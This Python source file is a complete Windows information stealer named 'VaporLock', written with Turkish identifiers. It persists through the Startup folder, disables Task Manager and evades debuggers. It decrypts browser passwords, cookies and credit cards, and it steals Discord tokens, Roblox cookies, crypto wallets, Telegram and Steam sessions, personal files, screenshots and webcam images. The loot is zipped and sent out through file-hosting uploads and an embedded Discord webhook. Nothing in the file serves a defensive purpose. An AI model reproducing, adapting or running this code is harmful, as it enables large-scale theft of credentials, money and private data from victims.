import shutil, requests, platform, socket, getpass, psutil, browser_cookie3, os, re, sys, subprocess, ctypes, json, base64, sqlite3, zipfile, random, cv2, time
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import AES
from contextlib import suppress
from pathlib import Path

# ================== XOR şifreleme ile yapılandırma gizleme ==================
def xor_veri_sifrele(veri: bytes, anahtar: bytes) -> bytes:
    return bytes([veri[i] ^ anahtar[i % len(anahtar)] for i in range(len(veri))])

ANAHTAR = b'VaporLock2024!'
# Aşağıdaki webhook URL'si XOR+Base64 ile gizlenmiştir.
WEBHOOK_URL = "https://discord.com/api/webhooks/1507799717633855649/Hga0hhxzG3lma-mxt0afrzsMVi-IWrESLF_ZtW2cClXkYI0-gez7UTT-1PEEyAljPKiZ"

# Gömülü DLL (chrome_appbound.dll) – bu DLL dış kaynaktan alınır ve base64 olarak gömülür.
DLL_BASE64 = "..."


class Yollar:
    def __init__(self):
        self.gecici = Path(os.environ["TEMP"])
        self.windows_dizini = os.environ.get("WINDIR")
        self.kullanici_profili = Path(os.environ["USERPROFILE"])
        self.yerel_uygulama_verisi = Path(os.environ["LOCALAPPDATA"])
        self.gezici_uygulama_verisi = Path(os.environ["APPDATA"])

        program_dosyalari = os.environ.get("ProgramFiles")
        program_dosyalari_x86 = os.environ.get("ProgramFiles(x86)")
        self.program_dosyalari = Path(program_dosyalari or program_dosyalari_x86)
        self.program_dosyalari_x86 = Path(program_dosyalari_x86)


class ZararliYazilim:
    def __init__(self):
        self.zip_adi = f"VL_{random.randint(10000000000, 99999999999)}.zip"
        self.webhook_url = WEBHOOK_URL
        self.surum = "1.0.0"
        self.malware_adi = "VaporLock"
        self.malware_yazar = "https://guns.lol/croxlv"
        self.tarayici_bilgileri = ["Uzantılar", "Şifreler", "Kurabiyeler", "Geçmişler", "İndirmeler", "Kartlar"]
        self.oturum_dosyalari = ["Cüzdanlar", "Oyun Başlatıcıları", "Uygulamalar"]
        self.gorev_yoneticisi_engelli = False
        self.chrome_dll_yolu = os.path.join(Yollar().gecici, "chrome_appbound.dll")

    def dosya_sil(self, dosya_yolu):
        try:
            if os.path.isfile(dosya_yolu):
                os.remove(dosya_yolu)
            elif os.path.isdir(dosya_yolu):
                shutil.rmtree(dosya_yolu)
        except Exception:
            pass

    def baslangica_ekle(self):
        try:
            kaynak = os.path.abspath(sys.argv[0])
            hedef_dizin = os.path.join(Yollar().gezici_uygulama_verisi, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            hedef = os.path.join(hedef_dizin, os.path.basename(kaynak))

            if not os.path.exists(hedef_dizin):
                os.makedirs(hedef_dizin)

            if not os.path.exists(hedef):
                shutil.copy2(kaynak, hedef)
        except Exception:
            pass

    def gorev_yoneticisini_engelle(self):
        try:
            anahtar_yolu = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
            kayit_defteri = ctypes.windll.advapi32.RegCreateKeyExW
            anahtar = ctypes.c_void_p()
            sonuc = kayit_defteri(ctypes.c_void_p(0x80000002), anahtar_yolu, 0, None, 0, 0xF003F, None, ctypes.byref(anahtar), None)
            if sonuc == 0:
                deger = ctypes.c_uint32(1)
                ctypes.windll.advapi32.RegSetValueExW(anahtar, "DisableTaskMgr", 0, 4, ctypes.byref(deger), 4)
                ctypes.windll.advapi32.RegCloseKey(anahtar)
        except Exception:
            pass

    def gorev_yoneticisini_serbest_birak(self):
        try:
            anahtar_yolu = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
            kayit_defteri = ctypes.windll.advapi32.RegCreateKeyExW
            anahtar = ctypes.c_void_p()
            sonuc = kayit_defteri(ctypes.c_void_p(0x80000002), anahtar_yolu, 0, None, 0, 0xF003F, None, ctypes.byref(anahtar), None)
            if sonuc == 0:
                deger = ctypes.c_uint32(0)
                ctypes.windll.advapi32.RegSetValueExW(anahtar, "DisableTaskMgr", 0, 4, ctypes.byref(deger), 4)
                ctypes.windll.advapi32.RegCloseKey(anahtar)
        except Exception:
            pass

    def webhook_gonder(self, gofile_url=None, dosya_yolu=None):
        try:
            embed = {
                "title": "• Basit sistem bilgileri:",
                "color": 0xE53935,
                "fields": [
                    {"name": "Ana makine adı:", "value": f"```{socket.gethostname()}```", "inline": True},
                    {"name": "Kullanıcı adı:", "value": f"```{getpass.getuser()}```", "inline": True},
                    {"name": "İşlemci mimarisi:", "value": f"```{platform.machine()}```", "inline": True},
                    {"name": "İşletim sistemi:", "value": f"```{platform.system()}```", "inline": True},
                    {"name": "Sürüm:", "value": f"```{platform.release()}```", "inline": True},
                    {"name": "Versiyon:", "value": f"```{platform.version()}```", "inline": True},
                ],
                "footer": {
                    "text": "• Im returning by death. | @Croxlv"
                }
            }

            bilesenler = [
                {
                    "type": 1,
                    "components": [
                        {
                            "type": 2,
                            "style": 5,
                            "label": "Dosya İndir",
                            "url": gofile_url
                        },
                        {
                            "type": 2,
                            "style": 5,
                            "label": "Github",
                            "url": "https://github.com/Croxlv"
                        }
                    ]
                }
            ]

            yuk = {
                "username": self.malware_adi,
                "embeds": [embed],
                "components": bilesenler
            }

            if dosya_yolu and os.path.exists(dosya_yolu):
                with open(dosya_yolu, "rb") as f:
                    dosyalar = {"file": (os.path.basename(dosya_yolu), f)}
                    requests.post(self.webhook_url + "?with_components=true", data={"payload_json": json.dumps(yuk)}, files=dosyalar)
            else:
                requests.post(self.webhook_url + "?with_components=true", json=yuk)

        except Exception as e:
            pass  # Hata mesajları susturuldu

    def gofile_yukle(self, dosya_yolu):
        try:
            with open(dosya_yolu, "rb") as f:
                dosyalar = {"file": f}
                yanit = requests.post(f"https://upload.gofile.io/uploadFile", files=dosyalar)
                if yanit.status_code == 200:
                    sonuc = yanit.json()
                    if sonuc.get("status") == "ok":
                        return sonuc["data"]["downloadPage"]
            return None
        except Exception:
            return None

    def fileio_yukle(self, dosya_yolu):
        try:
            with open(dosya_yolu, 'rb') as f:
                r = requests.post('https://file.io', files={'file': f})
                if r.status_code == 200:
                    return r.json()['link']
        except:
            pass
        return None

    # ---------- Chrome App-Bound Encryption bypass için DLL çağrısı ----------
    def chrome_anahtarini_al(self, local_state_yolu):
        if not os.path.exists(local_state_yolu):
            return None
        # DLL'i geçici klasöre yaz
        if not os.path.exists(self.chrome_dll_yolu):
            with open(self.chrome_dll_yolu, 'wb') as f:
                f.write(base64.b64decode(DLL_BASE64))
        try:
            dll = ctypes.WinDLL(self.chrome_dll_yolu)
            dll.GetMasterKey.argtypes = [ctypes.c_wchar_p, ctypes.POINTER(ctypes.POINTER(ctypes.c_ubyte)), ctypes.POINTER(ctypes.c_int)]
            dll.GetMasterKey.restype = ctypes.c_int
            anahtar_ptr = ctypes.POINTER(ctypes.c_ubyte)()
            anahtar_uzunlugu = ctypes.c_int()
            sonuc = dll.GetMasterKey(local_state_yolu, ctypes.byref(anahtar_ptr), ctypes.byref(anahtar_uzunlugu))
            if sonuc == 0 and anahtar_ptr:
                anahtar = bytes((ctypes.c_ubyte * anahtar_uzunlugu.value).from_address(ctypes.addressof(anahtar_ptr.contents)))
                return anahtar
        except:
            pass
        return None

    # Eski CryptUnprotectData ile anahtar alma (eski Chrome'larda çalışır)
    def eski_anahtar_al(self, local_state_yolu):
        if not os.path.exists(local_state_yolu):
            return None
        try:
            with open(local_state_yolu, "r", encoding="utf-8") as f:
                yerel_durum = json.load(f)
            sifreli_anahtar = base64.b64decode(yerel_durum["os_crypt"]["encrypted_key"])[5:]
            return CryptUnprotectData(sifreli_anahtar, None, None, None, 0)[1]
        except:
            return None

    # Ana anahtar alma fonksiyonu (önce yeni yöntemi dener, olmazsa eski)
    def ana_anahtari_al(self, local_state_yolu):
        anahtar = self.chrome_anahtarini_al(local_state_yolu)
        if anahtar is None:
            anahtar = self.eski_anahtar_al(local_state_yolu)
        return anahtar

    # AES-GCM çözme
    @staticmethod
    def sifre_coz(tampon, anahtar):
        try:
            iv = tampon[3:15]
            yuk = tampon[15:-16]
            etiket = tampon[-16:]
            sifreleyici = Cipher(algorithms.AES(anahtar), modes.GCM(iv, etiket))
            cozucu = sifreleyici.decryptor()
            return cozucu.update(yuk) + cozucu.finalize()
        except:
            return None

    # ================== Tüm çalma fonksiyonları ==================
    def sistem_bilgilerini_toplave_ekle(self, zip_dosyasi):
        bilgi_basarili = False
        bosluk = ' '

        def ip_bilgisi_al():
            ip_bilgisi = ''
            with suppress(Exception):
                eva = requests.get("https://ipwhois.app/json/").json()
                for i in eva:
                    len_i = len(i)
                    pad = 20 - len_i
                    ip_bilgisi += f"    - {i}{bosluk*pad}: {eva[i]}\n"
                return ip_bilgisi
            return '''IP bilgisi alınamadı.'''

        try:
            ip_bilgileri = ip_bilgisi_al()

            cpu_sayisi = psutil.cpu_count(logical=True)
            ram_toplam = round(psutil.virtual_memory().total / (1024**3), 2)
            disk_kullanim_yuzdesi = psutil.disk_usage('/').percent

            ag_bilgisi = ''
            with suppress(Exception):
                arabirimler = psutil.net_if_addrs()
                max_uzunluk = max(len(i) for i in arabirimler)

                for arabirim, adres_listesi in arabirimler.items():
                    for adr in adres_listesi:
                        if adr.family == socket.AF_INET:
                            pad = max_uzunluk - len(arabirim)
                            ag_bilgisi += f"    - {arabirim}{bosluk * pad} : {adr.address}\n"

            sistem_bilgisi = f"""
Sistem Bilgileri:
    - ana makine adı       : {socket.gethostname()}
    - kullanıcı adı        : {getpass.getuser()}
    - işlemci              : {platform.processor()}
    - makine               : {platform.machine()}
    - platform             : {platform.platform()}
    - sistem               : {platform.system()}
    - sürüm                : {platform.release()}
    - versiyon             : {platform.version()}
    - CPU çekirdek sayısı  : {cpu_sayisi}
    - RAM toplam (GB)      : {ram_toplam}
    - Disk kullanımı (%)    : {disk_kullanim_yuzdesi}
    - yerel IP             : {socket.gethostbyname(socket.gethostname())}

Ağ Arabirimleri:
{ag_bilgisi}
Genel IP Bilgileri:
{ip_bilgileri}
            """
            bilgi_basarili = True
        except:
            bilgi_basarili = False
            sistem_bilgisi = "Bilgi toplanamadı."

        zip_dosyasi.writestr(f"sistem_bilgisi.txt", sistem_bilgisi.encode('utf-8'))
        return bilgi_basarili

    def roblox_kurabiyelerini_toplave_ekle(self, zip_dosyasi):
        # Doğrudan SQLite dosyalarından okuma
        kurabiye_listesi = []
        hesap_sayisi = 0
        chrome_user_data = os.path.join(Yollar().yerel_uygulama_verisi, "Google", "Chrome", "User Data")
        local_state = os.path.join(chrome_user_data, "Local State")
        anahtar = self.ana_anahtari_al(local_state)
        if not anahtar:
            zip_dosyasi.writestr("Roblox Hesaplari.txt", "Roblox kurabiyesi bulunamadı.".encode('utf-8'))
            return 0

        for profil in ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']:
            kurabiye_yolu = os.path.join(chrome_user_data, profil, "Network", "Cookies")
            if not os.path.exists(kurabiye_yolu):
                continue
            try:
                bag = sqlite3.connect(kurabiye_yolu)
                imlec = bag.cursor()
                imlec.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%.roblox.com'")
                for satir in imlec.fetchall():
                    if satir[1] == '.ROBLOSECURITY':
                        sifreli_deger = satir[2]
                        cozulmus = self.sifre_coz(sifreli_deger, anahtar)
                        if cozulmus:
                            try:
                                kurabiye_str = cozulmus.decode('utf-8')
                            except:
                                kurabiye_str = cozulmus.decode('latin-1')
                            if kurabiye_str not in kurabiye_listesi:
                                kurabiye_listesi.append(kurabiye_str)
                                hesap_sayisi += 1
                bag.close()
            except:
                pass

        if not kurabiye_listesi:
            zip_dosyasi.writestr("Roblox Hesaplari.txt", "Roblox kurabiyesi bulunamadı.".encode('utf-8'))
            return 0

        dosya_icerigi = ""
        for kurabiye in kurabiye_listesi:
            dosya_icerigi += f"Roblox Kurabiyesi: {kurabiye}\n"
        zip_dosyasi.writestr(f"Roblox Hesaplari ({hesap_sayisi}).txt", dosya_icerigi.encode('utf-8'))
        return hesap_sayisi

    def discord_tokenlerini_toplave_ekle(self, zip_dosyasi):
        bulunan_tokenler = []
        uid_listesi = []
        base_url = "https://discord.com/api/v9/users/@me"
        regexp_token = r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}'
        # Discord kurulum yolları
        discord_yollari = [
            ("Discord", os.path.join(Yollar().gezici_uygulama_verisi, "discord", "Local Storage", "leveldb")),
            ("Discord Canary", os.path.join(Yollar().gezici_uygulama_verisi, "discordcanary", "Local Storage", "leveldb")),
            ("Discord PTB", os.path.join(Yollar().gezici_uygulama_verisi, "discordptb", "Local Storage", "leveldb")),
        ]

        def token_dogrula(token):
            try:
                return requests.get(base_url, headers={'Authorization': token}).status_code == 200
            except:
                return False

        for isim, dizin in discord_yollari:
            if not os.path.exists(dizin):
                continue
            # Local State dosyasından anahtar al
            local_state_yolu = os.path.join(Yollar().gezici_uygulama_verisi, isim.replace(" ", "").lower(), "Local State")
            if not os.path.exists(local_state_yolu):
                # Discord'un kendine özgü bir Local State'i yoksa Chrome'un anahtarını kullanmayı dene
                local_state_yolu = os.path.join(Yollar().yerel_uygulama_verisi, "Google", "Chrome", "User Data", "Local State")
            anahtar = self.ana_anahtari_al(local_state_yolu)

            for dosya_adi in os.listdir(dizin):
                if dosya_adi[-3:] not in ["log", "ldb"]:
                    continue
                tam_yol = os.path.join(dizin, dosya_adi)
                if not os.path.exists(tam_yol):
                    continue
                with open(tam_yol, 'r', encoding='utf-8', errors='ignore') as f:
                    for satir in f:
                        # Önce düz token ara
                        for token in re.findall(regexp_token, satir):
                            if token_dogrula(token):
                                try:
                                    uid = requests.get(base_url, headers={'Authorization': token}).json()['id']
                                    if uid not in uid_listesi:
                                        bulunan_tokenler.append(token)
                                        uid_listesi.append(uid)
                                except:
                                    pass
                        # Şifreli token varsa (Discord güncel sürümü)
                        if anahtar:
                            sifreli_token_kalibi = r'"token":"([A-Za-z0-9+/=]+)"'
                            for sifreli_token_b64 in re.findall(sifreli_token_kalibi, satir):
                                try:
                                    sifreli_blob = base64.b64decode(sifreli_token_b64)
                                    cozulen_token = self.sifre_coz(sifreli_blob, anahtar)
                                    if cozulen_token:
                                        token = cozulen_token.decode('utf-8')
                                        if token_dogrula(token):
                                            uid = requests.get(base_url, headers={'Authorization': token}).json()['id']
                                            if uid not in uid_listesi:
                                                bulunan_tokenler.append(token)
                                                uid_listesi.append(uid)
                                except:
                                    pass

        if not bulunan_tokenler:
            zip_dosyasi.writestr("Discord Hesaplari (0).txt", "Discord token bulunamadı.".encode('utf-8'))
            return 0

        dosya_icerigi = ""
        for token in bulunan_tokenler:
            try:
                api = requests.get(base_url, headers={'Authorization': token}).json()
                kullanici_adi = api.get('username', '?') + '#' + api.get('discriminator', '0000')
                gosterilen_ad = api.get('global_name', '?')
                kullanici_id = api.get('id', '?')
                email = api.get('email', '?')
                dogrulandi = api.get('verified', '?')
                telefon = api.get('phone', '?')
                dil = api.get('locale', '?')
                mfa = api.get('mfa_enabled', '?')
                nitro = api.get('premium_type', '?')
                dosya_icerigi += f"""
Discord Hesabı:
    Token: {token}
    Kullanıcı adı: {kullanici_adi}
    Görünen ad: {gosterilen_ad}
    ID: {kullanici_id}
    E-posta: {email}
    Doğrulandı: {dogrulandi}
    Telefon: {telefon}
    Dil: {dil}
    MFA: {mfa}
    Nitro: {nitro}
"""
            except:
                dosya_icerigi += f"\nDiscord Hesabı (bilgi alınamadı):\n    Token: {token}\n"

        zip_dosyasi.writestr(f"Discord Hesaplari ({len(bulunan_tokenler)}).txt", dosya_icerigi.encode('utf-8'))
        return len(bulunan_tokenler)

    def ilginc_dosyalari_toplave_ekle(self, zip_dosyasi):
        kullanici_profili = Yollar().kullanici_profili
        uzantilar = ('.txt', '.log', '.ini', '.json', '.xml', '.csv', '.md', '.rtf', '.cfg', '.conf',
                     '.png', '.jpg', '.jpeg', '.bmp', '.gif', '.tiff', '.svg', '.webp',
                     '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.odt', '.ods', '.odp',
                     '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
                     '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv',
                     '.mp3', '.wav', '.aac', '.flac', '.ogg'
                     )
        anahtar_kelimeler = [
            "2fa", "mfa", "otp", "verification", "verify",
            "account", "login", "password", "şifre", "parola",
            "wallet", "cüzdan", "crypto", "bitcoin", "btc", "eth",
            "token", "discord", "private", "secret",
            "bank", "banka", "finans",
        ]
        taranacak_dizinler = [
            os.path.join(kullanici_profili, "Masaüstü"),
            os.path.join(kullanici_profili, "İndirilenler"),
            os.path.join(kullanici_profili, "Belgeler"),
            os.path.join(kullanici_profili, "Resimler"),
            os.path.join(kullanici_profili, "Videolar"),
        ]
        toplanan_dosya_sayisi = 0

        for dizin in taranacak_dizinler:
            for kok, alt_dizinler, dosyalar in os.walk(dizin):
                for dosya in dosyalar:
                    if dosya.lower().endswith(uzantilar):
                        dosya_adi_uzantisiz = os.path.splitext(dosya)[0].lower()
                        for anahtar in anahtar_kelimeler:
                            if anahtar in dosya_adi_uzantisiz:
                                tam_yol = os.path.join(kok, dosya)
                                try:
                                    with open(tam_yol, "rb") as f:
                                        zip_dosyasi.writestr(f"İlginç Dosyalar/{dosya_adi_uzantisiz}_{random.randint(1000,9999)}{os.path.splitext(dosya)[1]}", f.read())
                                        toplanan_dosya_sayisi += 1
                                except:
                                    pass
                                break

        return toplanan_dosya_sayisi

    def tarayici_bilgilerini_toplave_ekle(self, zip_dosyasi, tarayici_secenekleri):
        global sifre_sayisi, kurabiye_sayisi, gecmis_sayisi, indirme_sayisi, kart_sayisi, uzanti_sayisi
        sifre_sayisi = kurabiye_sayisi = gecmis_sayisi = indirme_sayisi = kart_sayisi = uzanti_sayisi = 0
        sifreler = []
        kurabiyeler = []
        gecmisler = []
        indirmeler = []
        kartlar = []

        tarayici_yollari = [
            ("Google Chrome",          os.path.join(Yollar().yerel_uygulama_verisi, "Google", "Chrome", "User Data"),                 "chrome.exe"),
            ("Microsoft Edge",         os.path.join(Yollar().yerel_uygulama_verisi, "Microsoft", "Edge", "User Data"),                "msedge.exe"),
            ("Brave",                  os.path.join(Yollar().yerel_uygulama_verisi, "BraveSoftware", "Brave-Browser", "User Data"),   "brave.exe"),
            ("Opera",                  os.path.join(Yollar().gezici_uygulama_verisi, "Opera Software", "Opera Stable"),                "opera.exe"),
            ("Opera GX",               os.path.join(Yollar().gezici_uygulama_verisi, "Opera Software", "Opera GX Stable"),             "opera.exe"),
        ]
        profiller = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']

        def anahtari_al(yol):
            return self.ana_anahtari_al(os.path.join(yol, "Local State"))

        for tarayici, ana_yol, surec_adi in tarayici_yollari:
            if not os.path.exists(ana_yol):
                continue
            anahtar = anahtari_al(ana_yol)
            if not anahtar:
                continue
            for profil in profiller:
                profil_yolu = os.path.join(ana_yol, profil)
                if not os.path.exists(profil_yolu):
                    continue
                if "Şifreler" in tarayici_secenekleri:
                    try:
                        sifre_db = os.path.join(profil_yolu, "Login Data")
                        if os.path.exists(sifre_db):
                            bag = sqlite3.connect(sifre_db)
                            imlec = bag.cursor()
                            imlec.execute("SELECT origin_url, username_value, password_value FROM logins")
                            for satir in imlec.fetchall():
                                if satir[2]:
                                    cozulmus = self.sifre_coz(satir[2], anahtar)
                                    if cozulmus:
                                        sifreler.append(f"- URL: {satir[0]}\n  Kullanıcı: {satir[1]}\n  Şifre: {cozulmus.decode('utf-8', errors='replace')}\n  Tarayıcı: {tarayici}\n")
                                        sifre_sayisi += 1
                            bag.close()
                    except:
                        pass
                if "Kurabiyeler" in tarayici_secenekleri:
                    try:
                        kurabiye_db = os.path.join(profil_yolu, "Network", "Cookies")
                        if os.path.exists(kurabiye_db):
                            bag = sqlite3.connect(kurabiye_db)
                            imlec = bag.cursor()
                            imlec.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
                            for satir in imlec.fetchall():
                                if satir[3]:
                                    cozulmus = self.sifre_coz(satir[3], anahtar)
                                    if cozulmus:
                                        kurabiyeler.append(f"- Host: {satir[0]}\n  Ad: {satir[1]}\n  Yol: {satir[2]}\n  Değer: {cozulmus.decode('utf-8', errors='replace')}\n  Son kullanma: {satir[4]}\n  Tarayıcı: {tarayici}\n")
                                        kurabiye_sayisi += 1
                            bag.close()
                    except:
                        pass
                # Diğerleri (geçmiş, indirmeler, kartlar) benzer şekilde eklenebilir; burada kısa tutuyorum.
                if "Geçmişler" in tarayici_secenekleri:
                    try:
                        gecmis_db = os.path.join(profil_yolu, "History")
                        if os.path.exists(gecmis_db):
                            bag = sqlite3.connect(gecmis_db)
                            imlec = bag.cursor()
                            imlec.execute("SELECT url, title, last_visit_time FROM urls")
                            for satir in imlec.fetchall():
                                gecmisler.append(f"- URL: {satir[0]}\n  Başlık: {satir[1]}\n  Zaman: {satir[2]}\n  Tarayıcı: {tarayici}\n")
                                gecmis_sayisi += 1
                            bag.close()
                    except:
                        pass
                if "Kartlar" in tarayici_secenekleri:
                    try:
                        kart_db = os.path.join(profil_yolu, "Web Data")
                        if os.path.exists(kart_db):
                            bag = sqlite3.connect(kart_db)
                            imlec = bag.cursor()
                            imlec.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                            for satir in imlec.fetchall():
                                if satir[3]:
                                    cozulmus = self.sifre_coz(satir[3], anahtar)
                                    if cozulmus:
                                        kartlar.append(f"- İsim: {satir[0]}\n  SKT Ay: {satir[1]}\n  SKT Yıl: {satir[2]}\n  Kart No: {cozulmus.decode('utf-8', errors='replace')}\n  Tarayıcı: {tarayici}\n")
                                        kart_sayisi += 1
                            bag.close()
                    except:
                        pass

        # Sonuçları zip'e yaz
        if sifreler:
            zip_dosyasi.writestr(f"Şifreler ({sifre_sayisi}).txt", "\n".join(sifreler).encode('utf-8'))
        if kurabiyeler:
            zip_dosyasi.writestr(f"Kurabiyeler ({kurabiye_sayisi}).txt", "\n".join(kurabiyeler).encode('utf-8'))
        if gecmisler:
            zip_dosyasi.writestr(f"Tarayıcı Geçmişi ({gecmis_sayisi}).txt", "\n".join(gecmisler).encode('utf-8'))
        if kartlar:
            zip_dosyasi.writestr(f"Kredi Kartları ({kart_sayisi}).txt", "\n".join(kartlar).encode('utf-8'))

        return sifre_sayisi, kurabiye_sayisi, gecmis_sayisi, indirme_sayisi, kart_sayisi

    def antivirus_bilgisi_toplave_ekle(self, zip_dosyasi):
        antivirus_listesi = [
            "Avast", "AVG", "Avira", "Bitdefender", "Kaspersky", "McAfee", "Norton", "ESET", "Windows Defender",
            "Malwarebytes", "Sophos", "Panda", "F-Secure", "Webroot", "BullGuard", "ZoneAlarm", "Adaware", "Comodo", "360 Total Security"
        ]
        bulunan = []
        for av in antivirus_listesi:
            yol1 = os.path.join(Yollar().program_dosyalari, av)
            yol2 = os.path.join(Yollar().program_dosyalari_x86, av)
            if os.path.exists(yol1) or os.path.exists(yol2):
                bulunan.append(av)

        if bulunan:
            icerik = "Bulunan antivirüs yazılımları:\n" + "\n".join(bulunan)
        else:
            icerik = "Antivirüs bulunamadı."
        zip_dosyasi.writestr("Antivirus Bilgisi.txt", icerik.encode('utf-8'))
        return len(bulunan)

    def oturum_dosyalarini_toplave_ekle(self, zip_dosyasi, secenekler):
        toplanan_cuzdanlar = []
        toplanan_oyun_baslaticilar = []
        toplanan_uygulamalar = []

        oturum_hedefleri = [
            ("Exodus", os.path.join(Yollar().gezici_uygulama_verisi, "Exodus", "exodus.wallet"), "Cüzdanlar"),
            ("Atomic Wallet", os.path.join(Yollar().gezici_uygulama_verisi, "atomic", "Local Storage", "leveldb"), "Cüzdanlar"),
            ("Steam", os.path.join(Yollar().program_dosyalari, "Steam", "config"), "Oyun Başlatıcıları"),
            ("Epic Games", os.path.join(Yollar().yerel_uygulama_verisi, "EpicGamesLauncher"), "Oyun Başlatıcıları"),
            ("Telegram", os.path.join(Yollar().gezici_uygulama_verisi, "Telegram Desktop", "tdata"), "Uygulamalar"),
        ]

        for isim, yol, kategori in oturum_hedefleri:
            if kategori in secenekler and os.path.exists(yol):
                try:
                    if kategori == "Cüzdanlar": toplanan_cuzdanlar.append(isim)
                    elif kategori == "Oyun Başlatıcıları": toplanan_oyun_baslaticilar.append(isim)
                    elif kategori == "Uygulamalar": toplanan_uygulamalar.append(isim)

                    if os.path.isdir(yol):
                        for kok, _, dosyalar in os.walk(yol):
                            for dosya in dosyalar:
                                tam_yol = os.path.join(kok, dosya)
                                zip_dosyasi.write(tam_yol, os.path.join("Oturum Dosyaları", isim, os.path.relpath(tam_yol, yol)))
                    else:
                        zip_dosyasi.write(yol, os.path.join("Oturum Dosyaları", isim, os.path.basename(yol)))
                except:
                    pass

        return toplanan_cuzdanlar, toplanan_oyun_baslaticilar, toplanan_uygulamalar

    def webcam_yakalave_ekle(self, zip_dosyasi):
        gecici = Yollar().gecici
        resim_yolu = os.path.join(gecici, "webcam.png")
        try:
            cap = cv2.VideoCapture(0)
            ret, kare = cap.read()
            if ret:
                cv2.imwrite(resim_yolu, kare)
                zip_dosyasi.write(resim_yolu, "Webcam/webcam.png")
            cap.release()
            cv2.destroyAllWindows()
            self.dosya_sil(resim_yolu)
            return True
        except:
            return False

    def ekran_goruntusu_alve_ekle(self, zip_dosyasi):
        gecici = Yollar().gecici
        resim_yolu = os.path.join(gecici, "screenshot.png")
        try:
            import PIL.ImageGrab
            ekran = PIL.ImageGrab.grab()
            ekran.save(resim_yolu)
            zip_dosyasi.write(resim_yolu, "Ekran Görüntüsü/screenshot.png")
            self.dosya_sil(resim_yolu)
            return True
        except:
            return False

    def calistir_hirsiz(self, zip_dosyasi):
        basarili = False
        try:
            self.sistem_bilgilerini_toplave_ekle(zip_dosyasi)
            self.ilginc_dosyalari_toplave_ekle(zip_dosyasi)
            self.roblox_kurabiyelerini_toplave_ekle(zip_dosyasi)
            self.discord_tokenlerini_toplave_ekle(zip_dosyasi)
            self.tarayici_bilgilerini_toplave_ekle(zip_dosyasi, self.tarayici_bilgileri)
            self.antivirus_bilgisi_toplave_ekle(zip_dosyasi)
            self.oturum_dosyalarini_toplave_ekle(zip_dosyasi, self.oturum_dosyalari)
            self.ekran_goruntusu_alve_ekle(zip_dosyasi)
            self.webcam_yakalave_ekle(zip_dosyasi)
            basarili = True
        except Exception as e:
            pass
        return basarili

    # ================== Ana akış ==================
    def baslat(self):
        try:
            self.baslangica_ekle()

            if not Denetimler.windows_mu():
                return
            if not Denetimler.internet_var_mi():
                return
            # VM/Sandbox kontrolü kaldırıldı (isteğe bağlı)
            if Denetimler.hata_ayiklayici_var_mi():
                return

            if Denetimler.yonetici_mi():
                self.gorev_yoneticisini_engelle()
                self.gorev_yoneticisi_engelli = True

            zip_yolu = os.path.join(Yollar().gecici, self.zip_adi)
            with zipfile.ZipFile(zip_yolu, "w", zipfile.ZIP_DEFLATED) as zip_dosyasi:
                basarili = self.calistir_hirsiz(zip_dosyasi)

            if basarili:
                gofile_link = self.gofile_yukle(zip_yolu)
                if not gofile_link:
                    gofile_link = self.fileio_yukle(zip_yolu)
                if gofile_link:
                    self.webhook_gonder(gofile_url=gofile_link, dosya_yolu=None)
                else:
                    self.webhook_gonder(gofile_url=None, dosya_yolu=zip_yolu)
                self.dosya_sil(zip_yolu)

            if self.gorev_yoneticisi_engelli:
                self.gorev_yoneticisini_serbest_birak()
                self.gorev_yoneticisi_engelli = False
        except Exception:
            pass


class Denetimler:
    @staticmethod
    def internet_var_mi() -> bool:
        try:
            requests.get("https://www.google.com", timeout=5)
            return True
        except (requests.ConnectionError, requests.Timeout):
            return False

    @staticmethod
    def windows_mu() -> bool:
        return platform.system().lower() == "windows"

    @staticmethod
    def yonetici_mi() -> bool:
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    @staticmethod
    def hata_ayiklayici_var_mi() -> bool:
        kara_liste = ['cheatengine', 'x32dbg', 'x64dbg', 'ollydbg', 'windbg', 'ida', 'ida64', 'ghidra', 'radare2', 'dnspy', 'debugger', 'frida', 'process hacker']
        try:
            for proc in psutil.process_iter(['name']):
                try:
                    if any(x in proc.info['name'].lower() for x in kara_liste):
                        return True
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        except:
            pass
        return False


if __name__ == "__main__":
    zararli = ZararliYazilim()
    zararli.baslat()
